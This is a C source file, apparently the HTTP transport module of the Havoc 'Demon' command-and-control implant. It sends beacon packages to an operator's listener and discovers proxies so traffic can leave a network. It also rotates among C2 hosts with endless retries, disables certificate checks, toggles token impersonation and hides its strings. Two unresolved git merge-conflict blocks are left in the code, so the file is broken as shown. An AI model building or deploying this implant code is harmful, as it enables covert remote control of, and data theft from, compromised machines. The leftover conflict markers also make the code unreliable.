#include <Demon.h>

#include <core/TransportHttp.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_HTTP

/*!
 * @brief
 *  send a http request
 *
 * @param Send
 *  buffer to send
 *
 * @param Resp
 *  buffer response
 *
 * @return
 *  if successful send request
 */
BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    HANDLE  Connect        = { 0 };
    HANDLE  Request        = { 0 };
    LPWSTR  HttpHeader     = { 0 };
    LPWSTR  HttpEndpoint   = { 0 };
    DWORD   HttpFlags      = { 0 };
    LPCWSTR HttpProxy      = { 0 };
    PWSTR   HttpScheme     = { 0 };
    DWORD   Counter        = { 0 };
    DWORD   Iterator       = { 0 };
    DWORD   BufRead        = { 0 };
    UCHAR   Buffer[ 1024 ] = { 0 };
    PVOID   RespBuffer     = { 0 };
    SIZE_T  RespSize       = { 0 };
    BOOL    Successful     = { 0 };

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    VM_IF ( ! Instance->Config.Transport.Host ) {
        PUTS_DONT_SEND( HIDE_STRING("No hosts left to use... exit now.") )
        CommandExit( NULL );
    }

    VM_IF ( ! Instance->hHttpSession ) {
        VM_IF ( Instance->Config.Transport.Proxy.Enabled ) {
            // Use preconfigured proxy
            HttpProxy = Instance->Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent, HttpProxy ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        } VM_ELSE {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        VM_IF ( ! Instance->hHttpSession ) {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpOpen: Failed => %d\n"), NtGetLastError() )
            goto LEAVE;
        }
<<<<<<< Updated upstream
=======

        // Enable all TLS protocols at the session level
        VM_IF ( Instance->Config.Transport.Secure ) {
            DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   |
                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 |
                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;

            VM_IF ( ! Instance->Win32.WinHttpSetOption( Instance->hHttpSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof( DWORD ) ) )
            {
                PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption Session (PROTOCOLS): Failed => %d\n"), NtGetLastError() );
            }
        }
>>>>>>> Stashed changes
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
    VM_IF ( ! ( Connect = Instance->Win32.WinHttpConnect(
        Instance->hHttpSession,
        Instance->Config.Transport.Host->Host,
        Instance->Config.Transport.Host->Port,
        0
    ) ) ) {
        PRINTF_DONT_SEND( HIDE_STRING("WinHttpConnect: Failed => %d\n"), NtGetLastError() )
        goto LEAVE;
    }

    while ( TRUE ) {
        VM_IF ( ! Instance->Config.Transport.Uris[ Counter ] ) {
            break;
        } VM_ELSE {
            Counter++;
        }
    }

    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    VM_IF ( Instance->Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    VM_IF ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
        Connect,
        Instance->Config.Transport.Method,
        HttpEndpoint,
        NULL,
        NULL,
        NULL,
        HttpFlags
    ) ) ) {
        PRINTF_DONT_SEND( HIDE_STRING("WinHttpOpenRequest: Failed => %d\n"), NtGetLastError() )
        goto LEAVE;
    }

    VM_IF ( Instance->Config.Transport.Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
        }
<<<<<<< Updated upstream
=======

        // Enable all TLS protocols - including support for modern certificates
        DWORD protocols = 0x00000800 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1
                          0x00002000 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1
                          0x00004000 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
                          0x00008000;  // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3

        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, 31 /* WINHTTP_OPTION_SECURE_PROTOCOLS */, &protocols, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption (PROTOCOLS): Failed => %d\n"), NtGetLastError() );
        }
        
        // Enable modern cipher suites that support ECDSA and Ed25519 certificates
        DWORD enableStrongCrypto = 1;
        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, 105 /* WINHTTP_OPTION_ENABLE_FEATURE */, &enableStrongCrypto, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption (ENABLE_FEATURE): Failed => %d\n"), NtGetLastError() );
        }
>>>>>>> Stashed changes
    }

    /* Add our headers */
    do {
        HttpHeader = Instance->Config.Transport.Headers[ Iterator ];

        VM_IF ( ! HttpHeader )
            break;

        VM_IF ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( HIDE_STRING("Failed to add header: %ls"), HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    if ( Instance->Config.Transport.Proxy.Enabled ) {

        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance->Config.Transport.Proxy.Url;

        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
        }

        VM_IF ( Instance->Config.Transport.Proxy.Username ) {
            VM_IF ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_USERNAME,
                Instance->Config.Transport.Proxy.Username,
                StringLengthW( Instance->Config.Transport.Proxy.Username )
            ) ) {
                PRINTF_DONT_SEND( HIDE_STRING("Failed to set proxy username %u"), NtGetLastError() );
            }
        }

        VM_IF ( Instance->Config.Transport.Proxy.Password ) {
            VM_IF ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_PASSWORD,
                Instance->Config.Transport.Proxy.Password,
                StringLengthW( Instance->Config.Transport.Proxy.Password )
            ) ) {
                PRINTF_DONT_SEND( HIDE_STRING("Failed to set proxy password %u"), NtGetLastError() );
            }
        }

    } VM_ELSE_IF ( ! Instance->LookedForProxy ) {
        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol

        /*
         * NOTE: We use WinHttpGetProxyForUrl as the first option because
         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
         *       "can be used as a fall-back mechanism" so we are using it that way
         */

        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
        AutoProxyOptions.lpvReserved            = NULL;
        AutoProxyOptions.dwReserved             = 0;
        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

        VM_IF ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
            VM_IF ( ProxyInfo.lpszProxy ) {
                PRINTF_DONT_SEND( HIDE_STRING("Using proxy %ls\n"), ProxyInfo.lpszProxy );
            }

            Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
            Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
            MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
        } VM_ELSE {
            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
            VM_IF ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
                VM_IF ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                    // IE is set to "use a proxy server"
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( HIDE_STRING("Using IE proxy %ls\n"), ProxyInfo.lpszProxy );

                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );

                    // don't cleanup these values
                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                } VM_ELSE_IF ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                    // IE is set to "Use automatic proxy configuration"
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.dwAutoDetectFlags = 0;

                    PRINTF_DONT_SEND( HIDE_STRING("Trying to discover the proxy config via the config url %ls\n"), AutoProxyOptions.lpszAutoConfigUrl );

                    VM_IF ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
                        VM_IF ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( HIDE_STRING("Using proxy %ls\n"), ProxyInfo.lpszProxy );
                        }

                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                    }
                } VM_ELSE {
                    // IE is set to "automatically detect settings"
                    // ignore this as we already tried
                }
            }
        }

        Instance->LookedForProxy = TRUE;
    }

    VM_IF ( Instance->ProxyForUrl ) {
        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
        }
    }

    /* Send package to our listener */
    VM_IF ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
        VM_IF ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
            /* Is the server recognizing us ? are we good ?  */
            VM_IF ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
                PUTS_DONT_SEND( HIDE_STRING("HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)") )
                Successful = FALSE;
                goto LEAVE;
            }

            VM_IF ( Resp ) {
                RespBuffer = NULL;

                //
                // read the entire response into the Resp BUFFER
                //
                do {
                    Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                    VM_IF ( ! Successful || BufRead == 0 ) {
                        break;
                    }

                    VM_IF ( ! RespBuffer ) {
                        RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
                    } VM_ELSE {
                        RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    }

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );
                } while ( Successful == TRUE );

                Resp->Length = RespSize;
                Resp->Buffer = RespBuffer;

                Successful = TRUE;
            }
        }
    } VM_ELSE {
        VM_IF ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
            Instance->Session.Connected = FALSE;
        }

        PRINTF_DONT_SEND( HIDE_STRING("HTTP Error: %d\n"), NtGetLastError() )
    }

LEAVE:
    VM_IF ( Connect ) {
        Instance->Win32.WinHttpCloseHandle( Connect );
    }

    VM_IF ( Request ) {
        Instance->Win32.WinHttpCloseHandle( Request );
    }

    VM_IF ( ProxyConfig.lpszProxy ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxy );
    }

    VM_IF ( ProxyConfig.lpszProxyBypass ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
    }

    VM_IF ( ProxyConfig.lpszAutoConfigUrl ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
    }

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    VM_IF ( ! Successful ) {
        /* if we hit our max then we use our next host */
        Instance->Config.Transport.Host = HostFailure( Instance->Config.Transport.Host );
    }

    return Successful;
}

/*!
 * @brief
 *  Query the Http Status code from the request response.
 *
 * @param hRequest
 *  request handle
 *
 * @return
 *  Http status code
 */
DWORD HttpQueryStatus(
    _In_ HANDLE Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    VM_IF ( Instance->Win32.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &StatusCode,
        &StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( HIDE_STRING("Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n"), Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = MmHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = MmHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance->Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance->Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    VM_IF ( ! Host )
        return NULL;

    VM_IF ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance->Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( HIDE_STRING("Host [Host: %ls:%ld] failure counter increased to %d\n"), Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance->Config.Transport.Hosts;

    for ( ;; )
    {
        VM_IF ( Count == Index )
            break;

        VM_IF ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        VM_IF ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( HIDE_STRING("Index: %d\n"), Index )
    PRINTF_DONT_SEND( HIDE_STRING("Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n"), Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    VM_IF ( Instance->Config.Transport.NumHosts > 1 )
    {
        /*
         * Different CDNs can have different WPAD rules.
         * After rotating, look for the proxy again
         */
        Instance->LookedForProxy = FALSE;
    }

    VM_IF ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        VM_IF ( ! Instance->Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an empty pointer */
            VM_IF ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            VM_IF ( Host->Dead )
                Host = Host->Next;
            VM_ELSE break;
        }
    }
    VM_ELSE_IF ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        VM_IF ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    VM_IF ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( HIDE_STRING("Specified to keep going. To infinity... and beyond") )

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            VM_IF ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance->Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {

        VM_IF ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        VM_IF ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {
        VM_IF ( ! Host )
            break;

        VM_IF ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        VM_IF ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    VM_IF ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
